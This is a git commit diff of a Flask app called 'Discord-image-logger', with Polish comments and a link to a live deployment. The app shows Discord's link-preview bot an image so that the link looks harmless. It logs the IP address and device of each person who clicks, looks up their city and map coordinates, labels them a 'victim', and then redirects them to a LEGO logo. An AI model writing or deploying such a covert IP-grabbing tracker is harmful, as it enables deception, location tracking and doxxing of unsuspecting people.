3109910be7418c554f6801bea7fb7fa8390980fa
kuba31415-png <kuba.31415@gmail.com>
2026-02-07 00:54:33 +0100

    Discord-image-logger
    https://main-py-40u4.onrender.com/image.png?v=100

--- main.py
+++ main.py
@@ -4,12 +4,11 @@ import requests
 app = Flask(__name__)
 
 # --- KONFIGURACJA ---
-# Link do Twojego wybranego zdjęcia błędu
-ERROR_IMG = "https://preview.redd.it/failed-to-load-image-on-mobile-v0-v9v846fbt01a1.png?width=1080&format=png&auto=webp&s=5568f1857948270139b8f2f458e0a3f6a27e029c"
-# Zdjęcie, które widzi ofiara po kliknięciu
+# Nowy, lepszy obrazek błędu (czystszy)
+ERROR_IMG = "http://googleusercontent.com/image_collection/image_retrieval/15050586936953913730_0"
+# Zdjęcie docelowe
 REAL_IMG = "https://upload.wikimedia.org/wikipedia/commons/thumb/2/24/LEGO_logo.svg/500px-LEGO_logo.svg.png"
 
-# HTML z "czystymi" Meta Tagami
 HTML_TEMPLATE = f'''
 <!DOCTYPE html>
 <html>
@@ -31,20 +30,18 @@ def logger():
     ua = request.headers.get('User-Agent', '')
     ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
 
-    # Jeśli to bot Discorda - wysyłamy meta tagi obrazka
     if "Discordbot" in ua or "externalhit" in ua.lower():
         return render_template_string(HTML_TEMPLATE)
 
-    # LOGOWANIE DANYCH DO KONSOLI RENDERA
-    print(f"\n[!!!] OFIARA NAMIERZONA [!!!]")
-    print(f"IP: {ip}")
+    # LOGOWANIE DANYCH
+    print(f"\n[!!!] NOWA OFIARA: {ip}")
     try:
         r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,lat,lon", timeout=5).json()
         if r.get("status") == "success":
             print(f"LOKALIZACJA: {r.get('city')}, {r.get('regionName')}, {r.get('country')}")
             print(f"MAPA: http://www.google.com/maps/place/{r.get('lat')},{r.get('lon')}")
     except: pass
-    print(f"DEVICE: {ua}\n")
+    print(f"URZĄDZENIE: {ua}\n")
 
     return redirect(REAL_IMG)
 
